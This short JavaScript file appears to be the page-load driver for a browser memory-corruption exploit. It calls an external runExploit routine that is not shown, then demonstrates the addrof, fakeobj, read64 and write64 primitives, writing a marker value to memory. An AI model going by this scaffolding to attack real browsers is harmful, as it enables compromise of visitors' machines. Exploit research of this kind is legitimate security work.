// main.js

function log(msg) {
    const logDiv = document.getElementById('log');
    logDiv.textContent += msg + '\n';
    void logDiv.offsetHeight;
}

window.onload = async function() {
    log('Starting exploit...');
    try {
        await runExploit(log);
        log('Exploit complete!');
        // Example usage of primitives:
        let addr = addrof({});
        let fake = fakeobj(addr);
        let val = read64(addr);
        write64(addr, 0x41414141n);
        log(`Address: 0x${addr.toString(16)}, Fake Object: ${fake}, Value Read: 0x${val.toString(16)}`);
    } catch(e) {
        log('Exploit failed: ' + e);
    }
};
